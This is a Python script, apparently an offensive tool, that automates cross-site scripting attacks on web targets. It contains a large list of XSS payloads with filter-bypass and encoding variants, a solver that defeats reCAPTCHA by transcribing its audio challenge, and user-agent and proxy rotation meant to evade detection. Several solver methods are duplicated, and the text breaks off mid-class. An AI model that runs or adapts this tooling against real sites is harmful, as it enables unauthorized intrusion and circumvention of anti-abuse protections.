#!/usr/bin/env python3
"""
XSS-B2 Dropper Evasion Steal Mode Tool v2.3 
Enhanced XSS Automation Tool with Proxy Support, User Agent Rotation and reCAPTCHA Bypass
Author: Security Research Team
Warning: Use only on authorized targets!
"""

import argparse
import os
import subprocess
import time
import re
import json
import sys
import itertools
import random
import urllib.request
import pydub
import speech_recognition
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from contextlib import contextmanager
from typing import Optional
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    UnexpectedAlertPresentException, 
    NoAlertPresentException,
    TimeoutException,
    WebDriverException
)
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Try to import webdriver-manager for automatic driver management
try:
    from webdriver_manager.chrome import ChromeDriverManager
    from webdriver_manager.core.utils import ChromeType
    WEBDRIVER_MANAGER_AVAILABLE = True
except ImportError:
    WEBDRIVER_MANAGER_AVAILABLE = False

# Try to import rich for loading bar
try:
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

# Color constants
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"
MAGENTA = "\033[95m"

# Enhanced XSS payloads - focused on actual execution
DEFAULT_PAYLOADS = [
    # Basic script injections that should trigger alerts
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    
    # Image event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src=1 onerror=alert('XSS')>",
    "<img src=# onerror=alert('XSS')>",
    "<img src=/ onerror=alert('XSS')>",
    
    # SVG injections
    "<svg onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg/onload=alert('XSS')>",
    
    # Input/Form elements
    "<input onfocus=alert('XSS') autofocus>",
    "<input onmouseover=alert('XSS')>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    
    # Context breaking
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "';alert(1);//",
    "\";alert(1);//",
    "')alert('XSS')//",
    "\")alert('XSS')//",
    
    # Tag breaking
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    "'><img src=x onerror=alert('XSS')>",
    
    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(1)",
    "javascript:confirm('XSS')",
    
    # Body/HTML events
    "<body onload=alert('XSS')>",
    "<body onpageshow=alert('XSS')>",
    "<div onmouseover=alert('XSS')>test</div>",
    
    # Iframe injections
    "<iframe src=javascript:alert('XSS')>",
    "<iframe onload=alert('XSS')>",
    
    # Details/Summary
    "<details open ontoggle=alert('XSS')>",
    "<details ontoggle=alert('XSS')>",
    
    # Data URI
    "<script src=data:text/javascript,alert('XSS')></script>",
    "<iframe src=data:text/html,<script>alert('XSS')</script>></iframe>",
    
    # Event attributes
    "<button onclick=alert('XSS')>Click</button>",
    "<a href='javascript:alert(\"XSS\")'>Click</a>",
    "<marquee onstart=alert('XSS')>",
    
    # Filter bypass attempts
    "<script>eval('al'+'ert(1)')</script>",
    "<script>window['alert'](1)</script>",
    "<script>top['alert'](1)</script>",
    "<script>(alert)(1)</script>",
    "<script>setTimeout('alert(1)',1)</script>",
    
    # Encoded variations
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    
    # Simple variations for bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<img SRC=x onerror=alert('XSS')>",
    "<IMG SRC=x onerror=alert('XSS')>",
    "<svg ONload=alert('XSS')>",
    
    # Space and tab variations
    "<img\tsrc=x\tonerror=alert('XSS')>",
    "<img\nsrc=x\nonerror=alert('XSS')>",
    "<svg\x09onload=alert('XSS')>",
    
    # Short and effective payloads
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(1);//",
    "\";alert(1);//",
    
    # Additional context-breaking patterns
    "</script><script>alert('XSS')</script>",
    "';}</script><script>alert('XSS')</script>",
    "\");}</script><script>alert('XSS')</script>",
    # --- Advanced payloads ---
    # Unicode encoding
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # HTML entity encoding
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # JavaScript obfuscation
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    # Double encoding, mixed case, null bytes
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "<ScRiPt>\x00alert(1)\x00</ScRiPt>",
    # Template literal abuse
    "`${alert`1`}`",
    # Polyglot payloads
    "<svg><script>\u003c/script\u003e<iframe srcdoc=\"<script>alert(1)</script>\"></svg>",
    # CSS context (expression, unicode)
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "<div style=\"width:expression(alert(1))\">",
    # JSON context
    '"};alert(1);//',
    # URL context
    "javascript://%0Aalert(1)",
    # More polyglot
    "<script><img src=x onerror=alert(1)></script>",
]

# 10 Realistic User Agents for rotation
DEFAULT_USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Chrome on Android
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    # Safari on iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class RecaptchaSolver:
    """A class to solve reCAPTCHA challenges using audio recognition."""

    # Constants
    TIMEOUT_STANDARD = 7
    TIMEOUT_SHORT = 1
    TIMEOUT_DETECTION = 0.05

    def __init__(self, driver, logger) -> None:
        """Initialize the solver with a WebDriver instance.

        Args:
            driver: WebDriver instance for browser interaction
            logger: Logger instance for logging
        """
        self.driver = driver
        self.logger = logger

    def solve_captcha(self) -> bool:
        """Attempt to solve the reCAPTCHA challenge.

        Returns:
            bool: True if captcha was solved successfully, False otherwise
        """
        try:
            # Handle main reCAPTCHA iframe
            self.logger.info("Attempting to solve reCAPTCHA challenge...")
            
            # Switch to reCAPTCHA iframe
            iframe = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='reCAPTCHA']"))
            )
            
            # Click the checkbox
            checkbox = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "recaptcha-checkbox-checkmark"))
            )
            checkbox.click()
            time.sleep(2)

            # Check if solved by just clicking
            if self.is_solved():
                self.logger.success("reCAPTCHA solved with simple checkbox click")
                self.driver.switch_to.default_content()
                return True

            # Handle audio challenge
            self.logger.info("reCAPTCHA detected, switching to audio challenge...")
            audio_button = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                EC.element_to_be_clickable((By.ID, "recaptcha-audio-button"))
            )
            audio_button.click()
            time.sleep(1)

            if self.is_detected():
                self.logger.error("reCAPTCHA detected bot behavior")
                self.driver.switch_to.default_content()
                return False

            # Download and process audio
            audio_source = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                EC.presence_of_element_located((By.ID, "audio-source"))
            )
            src = audio_source.get_attribute("src")

            try:
                text_response = self._process_audio_challenge(src)
                self.logger.debug(f"Audio challenge recognized text: {text_response}")
                
                audio_response = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                    EC.presence_of_element_located((By.ID, "audio-response"))
                )
                audio_response.send_keys(text_response.lower())
                
                verify_button = WebDriverWait(self.driver, self.TIMEOUT_STANDARD).until(
                    EC.element_to_be_clickable((By.ID, "recaptcha-verify-button"))
                )
                verify_button.click()
                time.sleep(2)

                if self.is_solved():
                    self.logger.success("Successfully solved reCAPTCHA challenge")
                    self.driver.switch_to.default_content()
                    return True
                else:
                    self.logger.error("Failed to solve the reCAPTCHA after audio challenge")
                    self.driver.switch_to.default_content()
                    return False

            except Exception as e:
                self.logger.error(f"Audio challenge failed: {str(e)}")
                self.driver.switch_to.default_content()
                return False

        except Exception as e:
            self.logger.error(f"reCAPTCHA solving error: {str(e)}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False

    def _process_audio_challenge(self, audio_url: str) -> str:
        """Process the audio challenge and return the recognized text.

        Args:
            audio_url: URL of the audio file to process

        Returns:
            str: Recognized text from the audio file
        """
        temp_dir = os.getenv("TEMP") if os.name == "nt" else "/tmp"
        mp3_path = os.path.join(temp_dir, f"{random.randrange(1,1000)}.mp3")
        wav_path = os.path.join(temp_dir, f"{random.randrange(1,1000)}.wav")

        try:
            # Download audio file
            self.logger.debug(f"Downloading audio challenge from {audio_url}")
            urllib.request.urlretrieve(audio_url, mp3_path)
            
            # Convert to WAV format
            sound = pydub.AudioSegment.from_mp3(mp3_path)
            sound.export(wav_path, format="wav")

            # Recognize speech
            recognizer = speech_recognition.Recognizer()
            with speech_recognition.AudioFile(wav_path) as source:
                audio = recognizer.record(source)

            return recognizer.recognize_google(audio)

        except speech_recognition.UnknownValueError:
            raise Exception("Google Speech Recognition could not understand audio")
        except speech_recognition.RequestError as e:
            raise Exception(f"Could not request results from Google Speech Recognition service; {e}")
        except Exception as e:
            raise Exception(f"Audio processing error: {str(e)}")
        finally:
            # Clean up temporary files
            for path in (mp3_path, wav_path):
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except OSError:
                        pass

    def is_solved(self) -> bool:
        """Check if the captcha has been solved successfully."""
        try:
            checkbox = self.driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark")
            return "display: none" not in checkbox.get_attribute("style")
        except Exception:
            return False

    def is_detected(self) -> bool:
        """Check if the bot has been detected."""
        try:
            return "Try again later" in self.driver.page_source
        except Exception:
            return False

    def get_token(self) -> Optional[str]:
        """Get the reCAPTCHA token if available."""
        try:
            return self.driver.execute_script("return document.getElementById('recaptcha-token').value")
        except Exception:
            return None

    def _process_audio_challenge(self, audio_url: str) -> str:
        """Process the audio challenge and return the recognized text.

        Args:
            audio_url: URL of the audio file to process

        Returns:
            str: Recognized text from the audio file
        """
        temp_dir = os.getenv("TEMP") if os.name == "nt" else "/tmp"
        mp3_path = os.path.join(temp_dir, f"{random.randrange(1,1000)}.mp3")
        wav_path = os.path.join(temp_dir, f"{random.randrange(1,1000)}.wav")

        try:
            # Download audio file
            self.logger.debug(f"Downloading audio challenge from {audio_url}")
            urllib.request.urlretrieve(audio_url, mp3_path)
            
            # Convert to WAV format
            sound = pydub.AudioSegment.from_mp3(mp3_path)
            sound.export(wav_path, format="wav")

            # Recognize speech
            recognizer = speech_recognition.Recognizer()
            with speech_recognition.AudioFile(wav_path) as source:
                audio = recognizer.record(source)

            return recognizer.recognize_google(audio)

        except speech_recognition.UnknownValueError:
            raise Exception("Google Speech Recognition could not understand audio")
        except speech_recognition.RequestError as e:
            raise Exception(f"Could not request results from Google Speech Recognition service; {e}")
        except Exception as e:
            raise Exception(f"Audio processing error: {str(e)}")
        finally:
            # Clean up temporary files
            for path in (mp3_path, wav_path):
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except OSError:
                        pass

    def is_solved(self) -> bool:
        """Check if the captcha has been solved successfully."""
        try:
            checkbox = self.driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark")
            return "display: none" not in checkbox.get_attribute("style")
        except Exception:
            return False

    def is_detected(self) -> bool:
        """Check if the bot has been detected."""
        try:
            return "Try again later" in self.driver.page_source
        except Exception:
            return False

    def get_token(self) -> Optional[str]:
        """Get the reCAPTCHA token if available."""
        try:
            return self.driver.execute_script("return document.getElementById('recaptcha-token').value")
        except Exception:
            return None

def check_dependencies():
    """Check and install required dependencies for Kali Linux"""
    print(f"{YELLOW}[!]{RESET} Checking dependencies...")
    
    # Check if Chrome/Chromium is installed
    chrome_paths = [
        '/usr/bin/google-chrome',
        '/usr/bin/google-chrome-stable',
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/snap/bin/chromium'
    ]
    
    chrome_found = None
    for path in chrome_paths:
        if os.path.exists(path):
            chrome_found = path
            break
    
    if not chrome_found:
        print(f"{RED}[!]{RESET} Chrome/Chromium not found!")
        print(f"{YELLOW}[!]{RESET} Installing Chromium...")
        try:
            subprocess.run(['sudo', 'apt', 'update'], check=True, capture_output=True)
            subprocess.run(['sudo', 'apt', 'install', '-y', 'chromium'], check=True, capture_output=True)
            print(f"{GREEN}[+]{RESET} Chromium installed successfully")
        except subprocess.CalledProcessError:
            print(f"{RED}[!]{RESET} Failed to install Chromium. Please install manually:")
            print(f"    sudo apt update && sudo apt install chromium")
            sys.exit(1)
    else:
        print(f"{GREEN}[+]{RESET} Chrome/Chromium found: {chrome_found}")
    
    # Check Python packages
    required_packages = [
        'selenium',
        'requests',
        'beautifulsoup4',
        'webdriver-manager',
        'pydub',
        'SpeechRecognition',
        'rich'  # Added rich for loading bar
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"{YELLOW}[!]{RESET} Installing missing Python packages: {', '.join(missing_packages)}")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install'] + missing_packages, check=True)
            print(f"{GREEN}[+]{RESET} Python packages installed successfully")
        except subprocess.CalledProcessError:
            print(f"{RED}[!]{RESET} Failed to install Python packages. Please install manually:")
            print(f"    pip install {' '.join(missing_packages)}")
            sys.exit(1)
    
    # Check Arjun
    try:
        subprocess.run(['arjun', '--help'], capture_output=True, check=True)
        print(f"{GREEN}[+]{RESET} Arjun is available")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{YELLOW}[!]{RESET} Installing Arjun...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'arjun'], check=True)
            print(f"{GREEN}[+]{RESET} Arjun installed successfully")
        except subprocess.CalledProcessError:
            print(f"{RED}[!]{RESET} Failed to install Arjun. Please install manually:")
            print(f"    pip install arjun")
            sys.exit(1)

def get_chrome_driver_path():
    """Get ChromeDriver path with automatic management for Kali Linux"""
    if WEBDRIVER_MANAGER_AVAILABLE:
        try:
            # Try ChromeDriverManager first
            driver_path = ChromeDriverManager().install()
            print(f"{GREEN}[+]{RESET} ChromeDriver auto-installed: {driver_path}")
            return driver_path
        except Exception as e:
            print(f"{YELLOW}[!]{RESET} WebDriverManager failed: {str(e)}")
    
    # Check common ChromeDriver locations on Kali Linux
    common_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver',
        '/opt/google/chrome/chromedriver',
        './chromedriver'
    ]
    
    for path in common_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            print(f"{GREEN}[+]{RESET} Found ChromeDriver: {path}")
            return path
    
    # Try to download ChromeDriver manually
    print(f"{YELLOW}[!]{RESET} ChromeDriver not found. Attempting manual download...")
    try:
        # Download and install ChromeDriver
        download_chromedriver()
        if os.path.exists('./chromedriver'):
            os.chmod('./chromedriver', 0o755)
            return './chromedriver'
    except Exception as e:
        print(f"{RED}[!]{RESET} Failed to download ChromeDriver: {str(e)}")
    
    # Fallback: return None to use system PATH
    print(f"{YELLOW}[!]{RESET} Attempting to use ChromeDriver from system PATH...")
    return None

def download_chromedriver():
    """Download ChromeDriver for Linux"""
    import urllib.request
    import zipfile
    
    # Get Chrome version
    try:
        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
        if result.returncode != 0:
            result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
        
        version = result.stdout.strip().split()[-1].split('.')[0]
    except:
        version = "121"  # Default version
    
    # ChromeDriver download URL
    url = f"https://chromedriver.storage.googleapis.com/LATEST_RELEASE_{version}"
    
    try:
        with urllib.request.urlopen(url) as response:
            latest_version = response.read().decode().strip()
    except:
        latest_version = "121.0.6167.85"  # Fallback version
    
    download_url = f"https://chromedriver.storage.googleapis.com/{latest_version}/chromedriver_linux64.zip"
    
    print(f"{YELLOW}[!]{RESET} Downloading ChromeDriver {latest_version}...")
    
    urllib.request.urlretrieve(download_url, "chromedriver.zip")
    
    with zipfile.ZipFile("chromedriver.zip", 'r') as zip_ref:
        zip_ref.extract("chromedriver", ".")
    
    os.remove("chromedriver.zip")
    print(f"{GREEN}[+]{RESET} ChromeDriver downloaded successfully")

class UserAgentManager:
    def __init__(self, logger, custom_agents=None):
        self.logger = logger
        self.user_agents = custom_agents if custom_agents else DEFAULT_USER_AGENTS
        self.agent_cycle = None
        self.current_agent = None
        
        if self.user_agents:
            # Shuffle for better distribution
            random.shuffle(self.user_agents)
            self.agent_cycle = itertools.cycle(self.user_agents)
            self.logger.info(f"User agent rotation enabled with {len(self.user_agents)} agents")
        else:
            self.logger.warning("No user agents available")
    
    def get_next_agent(self):
        """Get next user agent in rotation"""
        if self.agent_cycle and self.user_agents:
            self.current_agent = next(self.agent_cycle)
            return self.current_agent
        return DEFAULT_USER_AGENTS[0]  # Fallback to first default agent
    
    def get_current_agent_info(self):
        """Get current user agent information for logging"""
        if self.current_agent:
            # Extract browser name from user agent
            if 'Chrome' in self.current_agent and 'Safari' in self.current_agent:
                if 'Edg' in self.current_agent:
                    browser = "Edge"
                elif 'Mobile' in self.current_agent:
                    browser = "Chrome Mobile"
                else:
                    browser = "Chrome"
            elif 'Firefox' in self.current_agent:
                browser = "Firefox"
            elif 'Safari' in self.current_agent and 'Chrome' not in self.current_agent:
                browser = "Safari"
            else:
                browser = "Unknown"
            
            # Extract OS
            if 'Windows NT 10.0' in self.current_agent:
                os_name = "Windows 10"
            elif 'Macintosh' in self.current_agent:
                os_name = "macOS"
            elif 'Linux' in self.current_agent:
                os_name = "Linux"
            elif 'Android' in self.current_agent:
                os_name = "Android"
            elif 'iPhone' in self.current_agent:
                os_name = "iOS"
            else:
                os_name = "Unknown"
            
            return f"{browser} on {os_name}"
        return "Default Agent"

class ProxyManager:
    def __init__(self, proxy_file, logger):
        self.logger = logger
        self.proxies = []
        self.working_proxies = []
        self.proxy_cycle = None
        self.current_proxy = None
        self.failed_proxies = set()
        self.use_direct_fallback = True
        self.proxy_timeout = 5
        
        if proxy_file:
            self.load_proxies(proxy_file)
            if self.proxies:
                self.test_proxies()
    
    def load_proxies(self, proxy_file):
        """Load proxies from file supporting HTTP, HTTPS, SOCKS5 formats"""
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            
            for line in lines:
                if '://' in line:
                    # Already has protocol
                    self.proxies.append(line)
                else:
                    # Assume HTTP if no protocol specified
                    self.proxies.append(f"http://{line}")
            
            if self.proxies:
                self.logger.info(f"Loaded {len(self.proxies)} proxies from {proxy_file}")
                self.logger.info(f"Supported formats: HTTP, HTTPS, SOCKS5")
            else:
                self.logger.warning("No valid proxies found in file")
                
        except FileNotFoundError:
            self.logger.error(f"Proxy file not found: {proxy_file}")
        except Exception as e:
            self.logger.error(f"Error loading proxies: {str(e)}")
    
    def test_proxy(self, proxy):
        """Test if a single proxy is working"""
        try:
            test_url = "http://httpbin.org/ip"
            session = requests.Session()
            session.proxies.update({
                'http': proxy,
                'https': proxy
            })
            # Use a basic user agent for proxy testing
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
            })
            
            response = session.get(test_url, timeout=self.proxy_timeout)
            if response.status_code == 200:
                return True
        except Exception:
            pass
        return False
    
    def test_proxies(self):
        """Test all proxies and keep only working ones"""
        self.logger.info("Testing proxy connectivity...")
        self.working_proxies = []
        
        for i, proxy in enumerate(self.proxies, 1):
            self.logger.debug(f"Testing proxy {i}/{len(self.proxies)}: {proxy}")
            
            if self.test_proxy(proxy):
                self.working_proxies.append(proxy)
                parsed = urlparse(proxy)
                self.logger.success(f"✓ Working proxy: {parsed.hostname}:{parsed.port}")
            else:
                parsed = urlparse(proxy)
                self.logger.warning(f"✗ Failed proxy: {parsed.hostname}:{parsed.port}")
                self.failed_proxies.add(proxy)
        
        if self.working_proxies:
            # Shuffle for better distribution
            random.shuffle(self.working_proxies)
            self.proxy_cycle = itertools.cycle(self.working_proxies)
            self.logger.success(f"Found {len(self.working_proxies)} working proxies out of {len(self.proxies)}")
        else:
            self.logger.error("No working proxies found!")
            if self.use_direct_fallback:
                self.logger.warning("Will fallback to direct connection")
            else:
                self.logger.error("Direct connection fallback disabled - exiting")
                sys.exit(1)
    
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if self.proxy_cycle and self.working_proxies:
            self.current_proxy = next(self.proxy_cycle)
            return self.current_proxy
        return None
    
    def mark_proxy_failed(self, proxy):
        """Mark a proxy as failed and remove from working list"""
        if proxy in self.working_proxies:
            self.working_proxies.remove(proxy)
            self.failed_proxies.add(proxy)
            
            # Recreate cycle with remaining working proxies
            if self.working_proxies:
                self.proxy_cycle = itertools.cycle(self.working_proxies)
                self.logger.warning(f"Marked proxy as failed: {proxy}")
                self.logger.info(f"Remaining working proxies: {len(self.working_proxies)}")
            else:
                self.proxy_cycle = None
                self.logger.error("All proxies have failed!")
                if self.use_direct_fallback:
                    self.logger.warning("Switching to direct connection")
    
    def get_proxy_for_requests(self):
        """Get proxy dict for requests library with fallback"""
        if self.working_proxies:
            proxy = self.get_next_proxy()
            if proxy:
                return {
                    'http': proxy,
                    'https': proxy
                }
        
        # Return None for direct connection if no working proxies
        if self.use_direct_fallback:
            return None
        else:
            raise Exception("No working proxies available and direct connection disabled")
    
    def get_proxy_for_selenium(self):
        """Get proxy string for Selenium Chrome options"""
        if self.working_proxies:
            proxy = self.get_next_proxy()
            if proxy:
                parsed = urlparse(proxy)
                if parsed.hostname and parsed.port:
                    return f"{parsed.hostname}:{parsed.port}"
        return None
    
    def get_current_proxy_info(self):
        """Get current proxy information for logging"""
        if self.current_proxy:
            parsed = urlparse(self.current_proxy)
            return f"{parsed.hostname}:{parsed.port}"
        return "Direct Connection"
    
    def has_working_proxies(self):
        """Check if there are any working proxies"""
        return len(self.working_proxies) > 0

class Logger:
    def __init__(self, log_file=None, verbose=False):
        self.log_file = log_file
        self.verbose = verbose
        
    def log(self, message, level="INFO", color="", prefix=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Console message with color and prefix
        if prefix:
            console_msg = f"{color}{prefix}{RESET} {message}"
        else:
            console_msg = f"{color}[{level}]{RESET} {message}"
        
        print(console_msg)
        
        # File message with timestamp (no color codes)
        if self.log_file:
            try:
                file_msg = f"[{timestamp}] [{level}] {message}"
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(file_msg + "\n")
            except Exception:
                pass  # Don't crash if log file can't be written
    
    def info(self, message):
        self.log(message, "INFO", GREEN, f"{GREEN}[+]{RESET}")
    
    def warning(self, message):
        self.log(message, "WARN", YELLOW, f"{YELLOW}[!]{RESET}")
    
    def error(self, message):
        self.log(message, "ERROR", RED, f"{RED}[!]{RESET}")
    
    def success(self, message):
        self.log(message, "SUCCESS", BOLD + GREEN, f"{BOLD}{GREEN}[✓]{RESET}")
    
    def debug(self, message):
        if self.verbose:
            self.log(message, "DEBUG", CYAN, f"{CYAN}[*]{RESET}")
    
    def proxy_info(self, message):
        self.log(message, "PROXY", MAGENTA, f"{MAGENTA}[P]{RESET}")

class XSSScanner:
    def __init__(self, args, logger):
        self.args = args
        self.logger = logger
        self.driver = None
        self.vulnerabilities_found = 0
        self.total_tests = 0
        self.proxy_manager = ProxyManager(getattr(args, 'proxy', None), logger)
        self.user_agent_manager = UserAgentManager(logger)
        self.bypass_recaptcha = getattr(args, 'bypassrecaptcha', False)
        self.use_terminal_bar = getattr(args, 'tbar', False) and RICH_AVAILABLE
        
        # Set proxy-only mode if specified
        if hasattr(args, 'proxy_only') and args.proxy_only:
            self.proxy_manager.use_direct_fallback = False
            logger.info("Proxy-only mode enabled - direct connection disabled")
        
        # Get ChromeDriver path
        self.chromedriver_path = get_chrome_driver_path()
    
    def validate_url(self, url):
        """Validate URL format and accessibility with improved proxy handling and user agent rotation"""
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.logger.error(f"Invalid URL format: {url}")
                return False
            
            # Try with proxy first (if available), then fallback to direct
            max_attempts = 3
            
            for attempt in range(max_attempts):
                try:
                    # Get next user agent for this request
                    user_agent = self.user_agent_manager.get_next_agent()
                    
                    session = requests.Session()
                    session.headers.update({
                        'User-Agent': user_agent
                    })
                    
                    # Use proxy if available
                    proxies = self.proxy_manager.get_proxy_for_requests()
                    connection_type = "Direct"
                    
                    if proxies:
                        session.proxies.update(proxies)
                        connection_type = f"Proxy: {self.proxy_manager.get_current_proxy_info()}"
                    
                    agent_info = self.user_agent_manager.get_current_agent_info()
                    self.logger.debug(f"Testing URL connectivity via {connection_type} with {agent_info} (attempt {attempt + 1})")
                    
                    response = session.head(url, timeout=8, allow_redirects=True)
                    if response.status_code >= 400:
                        self.logger.warning(f"URL returned {response.status_code}: {url}")
                        return False
                    
                    self.logger.debug(f"✓ URL validation successful via {connection_type} with {agent_info}")
                    return True
                    
                except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, 
                        requests.exceptions.ConnectionError) as proxy_error:
                    
                    if self.proxy_manager.current_proxy:
                        self.logger.warning(f"Proxy connection failed: {str(proxy_error)}")
                        self.proxy_manager.mark_proxy_failed(self.proxy_manager.current_proxy)
                        
                        if not self.proxy_manager.has_working_proxies():
                            self.logger.warning("No more working proxies, trying direct connection")
                            continue
                    else:
                        # Direct connection failed
                        self.logger.error(f"Direct connection failed for {url}: {str(proxy_error)}")
                        return False
                        
                except requests.exceptions.RequestException as e:
                    self.logger.warning(f"Request failed (attempt {attempt + 1}): {str(e)}")
                    if attempt == max_attempts - 1:
                        self.logger.error(f"URL validation failed for {url} after {max_attempts} attempts")
                        return False
                    continue
                    
            return False
            
        except Exception as e:
            self.logger.error(f"Unexpected error during URL validation for {url}: {str(e)}")
            return False
    
    def run_arjun(self, target, output_file):
        """Run Arjun parameter discovery tool (no proxy support in Arjun)"""
        try:
            self.logger.info(f"Running Arjun on {target}...")
            
            # Basic arjun command (Arjun doesn't support proxy)
            cmd = ["arjun", "-u", target, "-oT", output_file]
            
            # Add threads if specified
            if hasattr(self.args, 'threads') and self.args.threads:
                cmd.extend(["-t", str(self.args.threads)])
            
            # Note: Arjun doesn't support proxy, so parameter discovery uses direct connection
            self.logger.debug("Running Arjun via direct connection (Arjun doesn't support proxy)")
            
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            if result.returncode != 0:
                self.logger.error(f"Arjun failed on {target}: {result.stderr.strip()}")
                return ""
            else:
                self.logger.info(f"Arjun completed for {target}")
                return result.stdout
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"Arjun timed out for {target}")
            return ""
        except FileNotFoundError:
            self.logger.error("Arjun not found. Please install: pip install arjun")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"Arjun execution error: {str(e)}")
            return ""
    
    def parse_arjun_output(self, arjun_file):
        """Enhanced parameter extraction from Arjun output"""
        param_names = []
        try:
            if not os.path.exists(arjun_file):
                return []
                
            with open(arjun_file, "r", encoding="utf-8") as f:
                content = f.read()
                
            # Multiple regex patterns for different formats
            patterns = [
                r"\?([^=&\s]+)=",  # URL parameters
                r"([a-zA-Z_][a-zA-Z0-9_]*)\s*=",  # Direct parameters
                r'"([^"]+)"\s*:', # JSON-like parameters
                r"'([^']+)'\s*:", # Single quoted parameters
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content)
                param_names.extend(matches)
                
        except Exception as e:
            self.logger.error(f"Error parsing Arjun output: {str(e)}")
            
        # Clean and deduplicate
        cleaned_params = []
        for param in param_names:
            clean_param = re.sub(r'[^\w]', '', param)
            if clean_param and len(clean_param) > 1:
                cleaned_params.append(clean_param)
                
        return list(set(cleaned_params))
    
